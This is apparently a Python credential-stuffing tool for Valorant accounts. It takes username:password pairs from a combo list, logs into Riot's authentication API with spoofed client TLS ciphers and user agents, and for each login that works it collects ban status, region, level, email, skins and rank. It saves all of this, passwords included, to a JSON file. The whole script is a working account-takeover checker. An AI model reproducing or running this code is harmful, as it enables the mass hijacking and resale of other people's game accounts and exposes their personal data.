import os
import json
import ssl
import requests
from requests.adapters import HTTPAdapter
from colorama import Fore, Style, init
import threading
import data
import pandas
import time

# Initialize Colorama
init(autoreset=True)

AUTH_URL = "https://auth.riotgames.com/api/v1/authorization"

class SSLAdapter(HTTPAdapter):
    def init_poolmanager(self, *a, **k):
        c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        c.set_ciphers(':'.join(data.CIPHERS))
        k['ssl_context'] = c
        return super(SSLAdapter, self).init_poolmanager(*a, **k)

class ValorantAccount:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.puuid = None
        self.region = None
        self.country = None
        self.lvl = None
        self.ban_state =  None
        self.skins = None
        self.uuids = None
        self.lastplayed = None
        self.mail = None
        self.verified  = None
        self.registerdate = None
        self.rank = None
        self.session = None  # Store the session here
        self.entt_token = None
        self.access_token = None  # Initialize access_token as None

def load_accounts(file_path):
    accounts = []
    valid_lines = []
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="UTF-8") as f:
            lines = f.readlines()
            for line in lines:
                line = line.strip()
                if line:
                    # Split the line into username and password, if possible
                    account_info = line.split(":")
                    if len(account_info) == 2:
                        username, password = account_info
                        account = ValorantAccount(username, password)
                        accounts.append(account)
                        valid_lines.append(line)
                    else:
                        print(f"Skipping line with unexpected format: {line}")

        # Write the valid lines back to combo.txt
        with open(file_path, "w", encoding="UTF-8") as f:
            f.writelines('\n'.join(valid_lines))

    return accounts

def get_access_token(session, account):
    data_in = {
        "acr_values": "urn:riot:bronze",
        "claims": "",
        "client_id": "riot-client",
        "nonce": "oYnVwCSrlS5IHKh7iI16oQ",
        "redirect_uri": "http://localhost/redirect",
        "response_type": "token id_token",
        "scope": "openid link ban lol_region"
    }
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': f'RiotClient/{user_agent} %s (Windows;10;;Professional, x64)'
    }
    try:
        r = session.post(AUTH_URL, json=data_in, headers=headers, timeout=20)
        r2 = session.put(AUTH_URL, json={"type": "auth", "username": account.username, "password": account.password}, headers=headers, timeout=20)

        if r2.status_code == 200:
            try:
                uri = json.loads(r2.text)["response"]["parameters"]["uri"]
                if uri is not None:
                    access_token = uri.split("#access_token=")[1].split("&scope=")[0]
                    account.access_token = access_token
                    return "Valid"
            except (json.JSONDecodeError, KeyError):
                # JSON parsing failed or expected key is not found
                return "Invalid"
        else:
            print(f"Response was not 200. It was: {r2.status_code}")

    except Exception as e:
        print(f"Error: {e}")
    
    return "Error"

def get_entitlement_token(session, account):
    headers = {
        'User-Agent': f'RiotClient/{data.USER_AGENT} %s (Windows;10;;Professional, x64)',
        'Authorization': f'Bearer {account.access_token}',
    }
    try:
        with session.post(data.ENTITLEMENT_URL, headers=headers, json={}) as r:
            r.raise_for_status()  # Raise an exception if the HTTP request fails
            entitlement = r.json()['entitlements_token']

        r = session.post(data.USERINFO_URL, headers=headers, json={})
        r.raise_for_status()  # Raise an exception if the HTTP request fails
        return entitlement

    except requests.exceptions.RequestException as e:
        # Handle specific HTTP request exceptions
        print(f"An HTTP request exception occurred: {e}")
    except KeyError as e:
        # Handle a specific exception for missing 'entitlements_token' in the JSON response
        print(f"KeyError: {e}")

def get_puuid(session, account):
    if account.access_token:
        headers = {
            'User-Agent': f'RiotClient/{user_agent} %s (Windows;10;;Professional, x64)',
            'Authorization': f'Bearer {account.access_token}',
        }
        try:
            response = session.post(data.USERINFO_URL, headers=headers)
            response.raise_for_status()
            data_res = response.json()
            puuid = data_res['sub']
            return puuid
        except requests.exceptions.RequestException as e:
            print(f"An HTTP request exception occurred: {e}")
    return None

def get_info(session, account):
        # reg + country
        headers = {"User-Agent": f"RiotClient/{data.RIOTCLIENT} %s (Windows;10;;Professional, x64)",
                   "Pragma": "no-cache",
                   "Accept": "*/*",
                   "Content-Type": "application/json",
                   "Authorization": f"Bearer {account.access_token}"}
        userinfo = session.post(
            data.USERINFO_URL, headers=headers)
        #print(userinfo.text)
        userinfo = userinfo.json()
        try:
            try:
                region = userinfo['region']['id']
                fixedregion = data.LOL2REG[region]
                country = userinfo['country'].upper()
            except:
                country = userinfo['country'].upper()
                cou3 = data.A2TOA3[country]
                fixedregion = data.COU2REG[cou3]
            fixedregion = fixedregion.lower()
            progregion = fixedregion
            if fixedregion == 'latam' or fixedregion == 'br':
                progregion = 'na'
        except Exception as e:
            # input(e)
            fixedregion = 'N/A'

        #gamename = userinfo['acct']['game_name']
        #tagline = userinfo['acct']['tag_line']

        #print(gamename, tagline)

        try:
            registerdate = userinfo['acct']['created_at']
            registerdatepatched = pandas.to_datetime(int(registerdate), unit='ms')
        except Exception as e:
            registerdatepatched = "N/A"

        try:
            ban_state = userinfo['ban']['restrictions'][0]['type']
        except Exception as e:
            # input(e)
            ban_state = 'N/A'

        # lvl
        try:
            headers = {
                'X-Riot-Entitlements-JWT': account.entt_token,
                'Authorization': 'Bearer {}'.format(account.access_token)
            }
            response = session.get(f"https://pd.{progregion}.a.pvp.net/account-xp/v1/players/{account.puuid}", headers=headers)
            lvl = response.json()['Progress']['Level']
            #input(lvl)
        except Exception as e:
            lvl = 'N/A'

        try:
            headers={
                'Authorization': f'Bearer {account.access_token}',
                'Content-Type': 'application/json',
                'User-Agent': f'RiotClient/{user_agent} %s (Windows;10;;Professional, x64)',
            }

            r=session.get('https://email-verification.riotgames.com/api/v1/account/status',headers=headers,json={}).text

            mail = r.split('"email":"')[1].split('",')[0]

        except Exception as e:
            mail = None

        try:
            mailverif = bool(userinfo['email_verified'])
        except Exception as e:
            mailverif = True

        account.region = fixedregion
        account.country = country
        account.lvl = lvl
        account.ban_state = ban_state
        account.mail = mail
        account.registerdate = registerdatepatched
        account.verified = mailverif

def get_skins(session, account):
        # riot api counts latam and br as NA so u have to do this shit
        region = account.region
        if region.lower() == 'latam' or region.lower() == 'br':
            region = 'na'
        try:
            headers = {
                "X-Riot-Entitlements-JWT": account.entt_token,
                "Authorization": f"Bearer {account.access_token}"
            }

            # get skins using api
            r = session.get(
                f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{account.puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", headers=headers)
            # input(r.text)
            Skins = r.json()["Entitlements"]
            # file with skins' names
            with open(f'skins.json', 'r', encoding='utf-8') as f:
                response = json.load(f)

            # there could be a list but im 1 iq
            skinlist = []
            skinids = []
            for skin in Skins:
                # find skin's name by it's id
                try:
                    skinid = skin['ItemID']
                    for i in response['data']:
                        if skinid in str(i):
                            if i['displayName'] in skinlist:
                                break
                            skinlist.append(i['displayName'])
                            skinids.append(skinid.strip())
                            break

                except Exception as e:
                    #input(e)
                    pass
            if len(skinlist) > 0:
                account.skins = skinlist
                account.uuids = skinids
            else:
                account.skins = None
        except Exception as e:
            input(e)
            account.skins = None

def get_lastplayed(session, account):
        region = account.region
        if region.lower() == 'latam' or region.lower() == 'br':
            region = 'na'
        try:
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {account.access_token}",
                       "X-Riot-Entitlements-JWT": account.entt_token,
                       "X-Riot-ClientVersion": "release-05.12-shipping-21-808353",
                       "X-Riot-ClientPlatform": data.CLIENTPLATFORM
                       }
            r = session.get(
                f"https://pd.{region}.a.pvp.net/match-history/v1/history/{account.puuid}?startIndex=0&endIndex=10", headers=headers)
            data1 = r.json()
            # input(data)
            data2 = data1["History"]
            if data2 == []:
                if account.lastplayed is None:
                    account.lastplayed = 'A long time ago...'
                return
            #print(data2)
            data3 = data2[0]['GameStartTime']
            unix_time1 = data3
            unix_time1 = int(unix_time1)
            result_s2 = pandas.to_datetime(unix_time1, unit='ms')
            time = str(result_s2)
        except Exception as e:
            print(e)
            time = "N/A"
        account.lastplayed = time

def get_rank(session, account):
        region = account.region
        if region.lower() == 'latam' or region.lower() == 'br':
            region = 'na'
        try:

            if account.entt_token == False:
                return False
            RankIDtoRank = {"0": "Unranked", "1": "", "2": "", "3": "Iron 1", "4": "Iron 2", "5": "Iron 3",
                            "6": "Bronze 1", "7": "Bronze 2", "8": "Bronze 3", "9": "Silver 1", "10": "Silver 2", "11": "Silver 3", "12": "Gold 1",
                            "13": "Gold 2", "14": "Gold 3", "15": "Platinum 1", "16": "Platinum 2", "17": "Platinum 3", "18": "Diamond 1", "19": "Diamond 2", "20": "Diamond 3", "21": "Ascendant 1", "22": "Ascendant 2", "23": "Ascendant 3", "24": "Immortal 1", "25": "Immortal 2", "26": "Immortal 3", "27": "Radiant"}
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {account.access_token}",
                       "X-Riot-Entitlements-JWT": account.entt_token,
                       "X-Riot-ClientVersion": "release-05.12-shipping-21-808353",
                       "X-Riot-ClientPlatform": data.CLIENTPLATFORM}
            ranked = session.get(
                f"https://pd.{region}.a.pvp.net/mmr/v1/players/{account.puuid}/competitiveupdates", headers=headers)
            if '","Matches":[]}' in ranked.text:
                rank = "unranked"
            else:
                # input(ranked.json())
                rankid = str(ranked.json()['Matches'][0]['TierAfterUpdate'])
                account.lastplayed = pandas.to_datetime(ranked.json()['Matches'][0]['MatchStartTime'], unit='ms')
                rank = RankIDtoRank[rankid]
            account.rank = rank
        except Exception as e:
            print(e)
            account.rank = None

# Define a function to process an account with threading
def process_account(account):
    session = requests.Session()
    session.mount('https://', SSLAdapter())
    session.headers = {
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/plain, */*",
        'User-Agent': f'RiotClient/{user_agent} %s (Windows;10;;Professional, x64)'
    }

    if not account.access_token:
        status = get_access_token(session, account)

    if status == "Valid":

        print(f"{Fore.GREEN}Account: {account.username}, Valid Account.{Style.RESET_ALL}")

        puuid = get_puuid(session, account)
        if puuid:
            account.puuid = puuid
        else:
            print(f"Failed to fetch PUUID.")

        entt = get_entitlement_token(session, account)

        if entt:
            account.entt_token = entt
        else:
            print(f"Failed to fetch ENTT.")

        get_info(session, account)

        if account.ban_state == "PERMANENT_BAN":
            ban_status_color = Fore.RED
        elif account.ban_state != "N/A":
            ban_status_color = Fore.YELLOW
        else:
            ban_status_color = Fore.GREEN

        if account.region == "ap":
            region_color = Fore.GREEN
        else:
            region_color =  Fore.YELLOW

        if account.lvl is int:
            if account.lvl > 20:
                lvl_color = Fore.GREEN
            elif account.lvl < 20 and account.lvl > 10:
                lvl_color = Fore.YELLOW
            else:
                lvl_color = Fore.RED
        else:
            lvl_color = Fore.RED

        print(f"{region_color}Region: {account.region}{Style.RESET_ALL}")
        print(f"{lvl_color}Level: {account.lvl}{Style.RESET_ALL}")
        print(f"Country: {account.country}")
        print(f"{ban_status_color}Ban Status: {account.ban_state}{Style.RESET_ALL}")

        skin_count = None
        lastPlayed = None

        if account.region != "N/A":
            get_skins(session, account)
            get_lastplayed(session, account)
            get_rank(session, account)

            if account.skins != None:
                skin_count = len(account.skins)
            else:
                skin_count = 0

            if account.lastplayed != None:
                lastPlayed = str(account.lastplayed)

            if skin_count > 0 and skin_count < 20:
                skin_count_color = Fore.YELLOW
            elif skin_count > 20:
                skin_count_color = Fore.GREEN
            else:
                skin_count_color = Fore.RED

            if account.verified == True:
                verif_color = Fore.RED
            elif account.verified == False:
                verif_color = Fore.GREEN

            if account.rank == "Unranked":
                rank_color = Fore.RED
            elif "Iron" in account.rank or "Bronze" in account.rank or "Silver" in account.rank or "Gold" in account.rank:
                rank_color = Fore.YELLOW
            else:
                rank_color = Fore.GREEN

            print(f"Last Played: {account.lastplayed}")
            print(f"{skin_count_color}Skins Count: {len(account.skins)}{Style.RESET_ALL}")
            print(f"Skins: {account.skins}")
            print(f"{rank_color}Rank: {account.rank}{Style.RESET_ALL}")
            print(f"Mail Address: {account.mail}")
            print(f"{verif_color}Verified Mail: {account.verified}{Style.RESET_ALL}")
            print(f"Creation Date: {account.registerdate}")


        # Add account data to the list
        account_data = {
            "Username": account.username,
            "Password": account.password,
            "PUUID": account.puuid,
            "Region": account.region,
            "Level": account.lvl,
            "Country": account.country,
            "Ban_Status": account.ban_state,
            "Last_Played": lastPlayed,
            "Skins_Count": skin_count,
            "Skins": account.skins,
            "Rank": account.rank,
            "Mail": account.mail,
            "Mail Verified": account.verified,
            "Creation Date": str(account.registerdate)
        }

        # Open the JSON file for appending and write the account data
        with open("all_accounts_data.json", "a") as json_file:
            json.dump(account_data, json_file, indent=4)
            json_file.write(",\n")  # Add a newline to separate accounts

        # Remove the account from combo.txt
        remove_account_from_combo(account)

        time.sleep(5)
        return True

    elif status == "Invalid":
        print(f"{Fore.RED}Account: {account.username}, Invalid Account.{Style.RESET_ALL}")
        # Remove the account from combo.txt
        remove_account_from_combo(account)
        time.sleep(5)
        return False
    
    time.sleep(5)
    return False
    
def remove_account_from_combo(account):
    # Read the existing accounts from combo.txt
    with open("combo.txt", "r", encoding="UTF-8") as combo_file:
        lines = combo_file.readlines()

    # Filter out the line corresponding to the processed account
    lines = [line for line in lines if not line.startswith(f"{account.username}:{account.password}")]

    # Write the remaining unprocessed accounts back to combo.txt
    with open("combo.txt", "w", encoding="UTF-8") as combo_file:
        combo_file.writelines(lines)

def main():
    combo_file = "combo.txt"
    accounts = load_accounts(combo_file)

    thread_count = 1
    
    # Create a list to store threads
    threads = []

    # Iterate over accounts, creating threads for each account
    for account in accounts:
        thread = threading.Thread(target=process_account, args=(account,))
        threads.append(thread)
        thread.start()
        
        # Limit the number of concurrent threads
        if len(threads) >= thread_count:
            for t in threads:
                t.join()  # Wait for all threads to finish
            threads = []  # Clear the list of threads for the next batch

    # Wait for any remaining threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    user_agent = data.RIOTCLIENT  # Replace with your user agent string
    main()
